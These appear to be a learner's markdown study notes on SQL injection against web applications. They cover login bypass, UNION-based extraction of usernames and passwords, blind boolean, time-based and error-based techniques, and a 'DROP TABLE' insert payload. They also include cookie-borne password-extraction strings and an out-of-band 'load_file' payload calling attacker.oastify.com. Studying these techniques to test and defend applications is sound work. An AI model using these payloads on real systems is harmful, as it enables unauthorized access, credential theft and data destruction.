# SQL Injection (SQLi)

1. Web Security Vulnerability. 

2. Interfere with the queries that application makes to its database(DB).

3. causes persistent change to content/behaviour.

4. escalate - `compromise server/backend intra` and `DOS attacks`

## How to Detect?

Apply on every entry point in the Application i.e. `user-input fields`.

Example: 
1. login form
2. search box
3. URL parameter
4. cookies
5. HTTP-header
6. JSON/XML request body
7. hidden form fields 

### Login Form:
> username: `admin'--`          
> password: *bypassed* 

`--` is a comment hence all the query after `--` is bypassed.

database will see:
> SELECT * FROM users WHERE username = 'admin' *-- AND password = 'secret123'* 

#### Why this suceed?

1. Many SQL queries are buit using `STRING CONCATINATION`
2. no `sanitization` or `parameterized inputs`

##### example:  
string concatination:

> " SELECT * FROM users WHERE username = ' " + user + " ' AND password = ' " + pass + " ' ;

parameterized query:

> SELECT * FROM users WHERE username = ? AND password = ? ;

`?` - parameter placeholder that tells the database “this value is data only”, preventing SQL injection.  
`""` - identifier   
`''` - string

### Detect SQLi manutally | submit Inputs:

1. **single qoute character** `'` -> look for error or anomalies
2. **by forcing TRUE and FALSE conditions**  
    check if the application responds differently in a consistent way. 
    > GET /product?id=5 AND 1=1     // true AND true = true  
    GET /product?id=5 AND 1=2       // true AND false - false

    if getting different response - SQLi exist 

3. **time-based blind SQLi**  
    Payloads designed to trigger time delays - executed within a SQL query, and look for differences in the time taken to respond. 
    > GET /product?id=5 AND SLEEP(5)   // if delay - SQLi exist   

4. **OAST payloads designed to trigger an out-of-band network interaction**  
    database send n/w request to the application  
    > UNION SELECT load-file("\\\\attacker.oastify.com/test")--

    DB execte the load-file()  
    DB try to access the remote n/w resource  
    cause DNS/SMB request   
    SQLi exist | confirms code execution inside SQL query.


### SQL injection in different parts of the query

1. **In `UPDATE` statements**:

    vulnerable query:
    > UPDATE users SET email = 'USER_INPUT' WHERE id = 5;  

    Attacker input:
    > test@mail.com', role='admin' --

    final query:
    > UPDATE users SET email='test@mail.com', role='admin' --' WHERE id=5;

    user has become admin.

2. **In `INSERT` statement**:

    vulnerable query:
    > INSERT INTO users (username, password) VALUES ('USER', 'PASS');

    Attacker input:
    > USER = attacker', 'x'); DROP TABLE users; --

    final query:
    > INSERT INTO users (username, password)   
    VALUES ('attacker', 'x'); DROP TABLE users; --', 'PASS');

    database is manipuated/deleted

3. **In SELECT statements, within the table or column name**
    
    this happends when dev dynamically buid indentifers

    vulnerable query:
    > SELECT 'user_inpu' FROM users;

    attackers input:
    > username FROM users' WHERE '1'='1

    final query:
    > SELECT username FROM users WHERE '1'='1';

    all the rows returned

4. **SELECT statement - ORDER BY clause**

    vulnerable query:
    > SELECT * FROM products ORDER BY USER_INPUT;

    attackes input:
    > price DESC, (SELECT SLEEP(5))

    final query:
    > SELECT * FROM products ORDER BY price DESC, (SELECT SLEEP(5));

    #### Order by is gold to for blind SQLi. WHY?  
    1. hard to secure  
    2. easy to test
    3. no need to change page contect to check for SQLi.  
        `WHERE` filter rows -> visble change  
        `ORDER BY` just sort the rows 
        hence page still loads.  
        No obvious Attacks.  
        easy to test repeatedly.  

    4. prefect for time-based SQLi
        > ORDER BY IF(1=1, SLEEP(5), price)  
    
    5. prefect for boolean based attacks
        > ORDER BY CASE WHEN 1=1 THEN price ELSE name END  

        vs  
        
        > ORDER BY CASE WHEN 1=2 THEN price ELSE name END

        If behavior differs → SQL executed.
 
    6. preaped statement dont work.  
        one can't do  
        > ORDER BY ?  
    
    ### if pentester see `GET /products?sort=price`, ORDER BY is injectable unless proved otherwise.


## Retive hidden data:

The URL for listing specific products is:  
> https://insecure-website.com/products?category=Gifts  

check the SQL query that is being send as a request.    
> SELECT * FROM products WHERE category = 'Gifts' AND released = 1

`release` is a intersing keyword here.  
It is being used to hide the product that is not released yet.    
We could assume for unreleased products, `released = 0`.

attacker'd modification to URL:
> https://insecure-website.com/products?category=Gifts'--

final SQL query:
> SELECT * FROM products WHERE category = 'Gifts' *--' AND released = 1*


**example**:  
> https://insecure-website.com/products?category=Gifts'+OR+1=1--

SQL query in request:
> SELECT * FROM products WHERE category = 'Gifts' OR 1+1 *--'release = 1*

## Subverting Application Logic - login bypass:

An application has a login page.  
It uses following SQL query to login:  
> SELECT * FROM users WHERE username = 'abc' AND password = 'abc@123'

You can bypass the password by login as any user just by using `--`
> username: john@a.com'--

final query becomes:
> SELECT * FROM username = 'john@a.com'*--' password = ''*

password is bypassed.  
attacker have access to user john@a.com account.

## SQLi UNION attacks:

It is used for retrievel of information and not login bypass.  

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from `other tables` within the database.  

`UNION` combines the results of two SELECT queries into one single output.
>SELECT a, b FROM table1 UNION SELECT c, d FROM table2

- Rle 1 - **column number must match**  
    Both SELECTs must return the same number of columns.

- Rule 2 - **Data types must be compatible**
    column postion must make sense.
    - a ↔ c
    - b ↔ d

This attack only works when:
1. column count of attackers query must match with orignal query 
2. data type is matched 
3. output is refelected on the page 

#### How know number of coloum in original attack?
1. **inject series of `ORDER BY` clause** and increase the column index untill an error occurs.  
    > ' ORDER BY 1  
    ' ORDER BY 2  
    ' ORDER BY 3  
    etc.  

    `ORDER BY` allow to refer to column using index number. 

    column number that dont exit - DB throws error.  

2. **submitting a series of UNION SELECT payloads** specifying a different number of null values.
    > ' UNION SELECT NULL--  
    ' UNION SELECT NULL,NULL--  
    ' UNION SELECT NULL,NULL,NULL--  
    etc.  
    
    keep adding `null` until it works.  
    if number of null does not match number of column - DB throws error

    NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.   

    When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.

    **what to look for?** 
    1. when null count is correct - aditional content within the HTTP response. eg- extra row on an HTML table.
    2. null value might trigger `nullPointerException` (app crash) - meaning column count is correct 
    3. worst case - same response | page look same | no error (method has become ineffective)

    **ORACLE**  
    On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table.  
    There is a built-in table on Oracle called `dual` which can be used for this purpose.
    > ' UNION SELECT NULL FROM DUAL--

### finding coloum with useful datatypes:  

The interesting data that you want to retrieve is normally in string form.  
means - `find one or more column with string compatible datatype.`

step:  
1. find number of columns.
2. probe each column to check if it can hold string data.  
    submit series `UNION SELECT` payloads that place a string value into each column in turn.  

    `example` : query returned 4 column.  
        the check for string datatype in columns will look like: 
    > ' UNION SELECT 'a',NULL,NULL,NULL--  
    ' UNION SELECT NULL,'a',NULL,NULL--  
    ' UNION SELECT NULL,NULL,'a',NULL--  
    ' UNION SELECT NULL,NULL,NULL,'a'--

    If the column data type is not compatible with string data, the injected query will cause a database error

    If no error - that column have a string values.

### SQLi UNION attack - Retrieving information  
Step #1 - confirm if SQl injection is possible. `(' OR 1=1--)`  
Step #2 - determine the number of columns.      
Step #3 - identify the columns of string Data-type.  
**Step #4 - retrieve interesting information**  

To retrieve string information from the table - you **need to know**:  
1. **table name**
2. **columns name**

`example`:   
    suppose that:  
    table name = user,
    column name = username, password (both string DataType)  
   **retrieve information using query:**
> ' UNION SELECT username, password FROM users--

*All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.*

**Retrieving multiple values within a single column:**

> ' UNION SELECT username || '~' || password FROM users--  

The `||` used in oracle to concatenate string.

> ' UNION SELECT CONCAT(username,'~',passoword) FROM users--  

Above is the way to do same in MySQL 

> ' UNION SELECT username + '~' + password FROM users--

In SQL server version, above

output will be like:
> ...  
  admin~pass123  
  john~john123@  
  ...  

**real life example:**
> ' UNION SELECT null, CONCAT(username, '~', password) FROM users --


### Examining the database in SQL injection attacks:  

to exploit the SQL injection vulnerabilties, its imporant to know information about database.  
like,  
- type / version of DB software.
- tables / columns the DB contails. 

#### How to know fatabase type and version?   
Inject `provider-specific queries` to see if one works.

##### queries to know Database version:  
| Database type | Query |
|:---------------|:-------|
| microsoft, MySql | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()`|  

example:
> ' UNION SELECT @@version--


#### List contents of the database - step #1 of database enumeration.

Most database types(except oracle) have information schemas.

##### Steps:   
#1. **list tables** in the Database- query `information_schema.tables`:
> SELECT *  
FROM information_schema.tables  

information_schema : system database  | store metadata about the DBs  

output:  
| table_catalog | table_schema | table_name | table_type|
|:--------------|:-------------|:-------------|:------------|
MyDatabase | app_db | users | BASE TABLE|
MyDatabase | app_db | orders | BASE TABLE|
MyDatabase | mysql | feedback | BASE TABLE |  

#2. next query `information_schema.columns` to **list columns** in individual tables. 
> SELECT *   
FROM information_schema.columns   
WHERE table_name = 'Users'

output:
| table_catalog | table_schema | table_name | column_name | data_type |
|:--------------|:-------------|:-----------|:------------|:-----------|
| myDatabase | app_db | users | UserId | int |
| myDatabase | app_db | users | username | varchar |
| myDatabase | app_db | users | Password | varchar | 


### Blind SQL injection:

Occuers when the SQLi is possible in a website   
but its HTTP responses `don't` contain the result of the relevant SQL query   
or details of any DB errors.

**SQLi `UNION` attacks - fails | ineffective** coz it rely on the response of injected query in applications `HTTP response`.

#### How to perform Blind SQLi?

##### #1. trigerring conditional responses.
cookies - used to gather analytics about app usage.  
Request to the app include a cookie header like this:
> Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4  

when a request containing the `TrackingId`cookie is processed - app use SQL query to confirm the session(determine whether this is a known user)
> SELECT TrackingId   
FROM TrackedUsers   
WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

this query is **vulnerable to SQLi** - but **result from the query is not returned** to the user - app behaves differently (SIDE CHANNEL):  
If you submit a recognized `TrackingId`, the query `returns data `and you receive a `"Welcome back"` message in the response.  

This behavior is enough to exploit the blind SQLi vulnerabilty. 
You can retrieve information by triggering different responses conditionally, depending on an injected condition. 

#### Where the vulnerability is?
`trackingId` is directly placed inside SQL
> WHERE TrackingId = '<USER INPUT>'

we can inject the SQL inside the `cookie value`. 

**Test:**  
Replace the cookie:  
> TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND 1=1--

SQL becomes:  
> SELECT TrackingId  
FROM TrackedUsers   
WHERE TrackingId = ' u5YD3PapBcR4lN3e7Tj4 **' AND 1=1--** '  

`1=1` -> true   
Query will return a row.  
'Welcome back' appears. 

Replace the cookie:
> TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND 1=2--

SQL becomes:  
> SELECT TrackingId  
FROM TrackerUsers  
WHERE TrackingId = ' u5YD3PapBcR4lN3e7Tj4 **' AND 1=2--** '

`1=2` -> false  
Query return no row.  
No 'welcome back'.

**Test one character at a time**  
Start:
> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Adminstrator'),1,1) > 'm  

`> m` -> comparison  
lexicographical(alphabetical) comparison  
`a, b, c, ..., m, n, o, p, q, ...  `  
so:  
`'p' > 'm'` => true  
`'a' > 'm'` => false  

If first letter of the Password is greater than `m` -> true -> "welcomeback" will be returned -> 1st letter of password is > `m`

**use INTRUDER (brup suite)** for recursivily doing same task (test the character at each position)

Attackers use this for **BINARY SEARCH** instead of brute force.

### Error Based SQLi:

use of error messages to extract or infer sensitive data from the DB, even in **blind context**.

The application can be indued to return a specific response based on result of a boolean expression.

some application dont handle DB error properly.  
**let DB error message **leak** into HTTP response.**

#### How error is leaked?

some SQL functions intentionally throw errors.  
And that include the value being processed.

> SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e));  

EXTRACTVALUE -> an XML function in MySQL | used to **extract data from XML** using XPath

The first arugment -> `1` is not a vaild XML.  
MySql try to parse it.  
guarantees an error is thrown.  
This error will include the XPath expression (2nd argument)

2nd argument -> `CONCAT(0x7e, password, 0x7e)`  
`0x7e` - `~` tilde in hex  
output of this concat -> `~pass123`

`LIMIT 1` is used to only return 1 row from the table

This will try to extract value from XML with XPath `~pass123~` which is acutally not a XPath    
and even `1` is not a `xml_documnet`

#### Common injection points:
1. URL parameters
2. cookies
3. user-agent headers
4. referer headers

#### Only works when:
1. errors are visible in HTTP response
2. MySql DB
3. XMl function is active. **(depricated after MySql 8.0)**

#### common dev mistake to look for:
1. database error not supressed
2. debug mode enabled in production
3. exceptions returned directly to users

#### Error based SQLi techniques:

1. **MySQL**
    - `EXTRACTVALUE()`
    - `UPDATEVALUE()`

2.  **PostgreSQL**
    - type caste error
    - `to_char()` misuse

3. **Orcale**
    - `UTL_INADDR.get_host_name`
    - `DBMS_XMLGEN`

4. **SQL server**
    - `CONVERT(int, 'text')`
    - division by zero

#### Exploiting blind SQLi by triggering conditonal errors

*This technique will answer to the question "**DID THE DATABASE THROW AN ERROR?**"*

##### Why this technique is needed?
1. app does not show query results

2. The application’s response does not change whether rows are returned or not → so **boolean-based blind SQLi fails**  

3. app does behave differently when a database error is occured.

In the trackingID of cookie:

> xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a

1 != 2 -> else part is evaluated -> 'a' = 'a' -> true -> **no error -> app response normally**

> xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END) ='a

1 = 1 -> id part is evaluated -> 1/0 -> **divided-by-zero error -> DB error** -> app resonse change (error page/ 500/ broken response)

##### Real Data Extraction payload:
> xyz' AND  
(SELECT CASE   
WHEN   
(Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm')  
THEN 1/0  
ELSE 'a'  
END  
FROM Users) = 'a 

If the case condition is true -> error (divided by 0)   
If the case condition is false -> normal resonse. 

**The data leak can be done one character at a times**

#### Concatenation is not required for SQL injection — it’s a workaround for strict string contexts.  
example in ORACLE database:  
1. subqueries must be scalar.
2. types must match
3. expression must be valid.

##### Concatenation `||` is not requied when:
1. injecting boolean condition.
2. app behaviour change based on true/flase
3. no need to return a string.

##### Concatenation is requied when:
- can't inject `AND`, `OR`, `UNION`

> 'xyz'||(SELECT username FROM users WHERE ROWNUM=1)||'

#### real life implemenation on a Oracle DB
> Cookie: TrackingId=5awBmGqD8fiB1DR8'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)) ||';

You can use this behavior to test whether specific entries exist in a table.  
For example, use the following query to check whether the username administrator exists:
> TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

##### Check the length of password:
> TrackingId=xyz' ||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

this query will check if the length of password is > than 1 
true -> throws error 
false -> normal resopnse.

##### Check the password word by word - *use burp intruder.*
> TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='`$a$`' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

 The application returns an `HTTP 500` status code when the **error** occurs  
 and `HTTP 200` - request was successful (ok)

 ### Extracting sensitive data via verbose SQL error messages

 misconfiguration of database sometimes result in **verbose** error messages.  
  verbose - extra information

 #### Key idea of this attack:
make the DB throw error that include the Data attacker wants.  
instead of asking ***"is this condition true?"***   
you for the database to say `"I tried to convert this value and failed"`

#### use of CAST():
convert one datatype into another.  

example:
> CAST('123' AS int) // no error | works  
> CAST('abc' AS int) // error | cant typecast

error: 
> invalid input syntax for type integer: "abc"

String value appear inside of the error.

#### How attacker will exploit it ?
> CAST((SELECT password FROM users WHERE username='admin') AS int)

error:
> ERROR: invalid input syntax for type integer: "s3cr3t"

Password is leaked.

#### When it will work?
1. DB error is not suppressed.
2. error messages are returned to client.
3. Db include failing value in the error.

### character-limit note matters

Sometime app limit characters. like:  
- cookies max 30-40 characters
- URL parameter length restrictions
- input filed truncated.

**PAYLOAD length limitation in most of the blind SQLi**  
example:
> CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END

payload is lengthy, more keywords, etc  
`attack can fail` as payload get cut, query breaks, etc.

### `CAST()` to the rescue

Small payload  
no `case` 
No  `substring`  
No loops/comparisons  
direct error is thrown.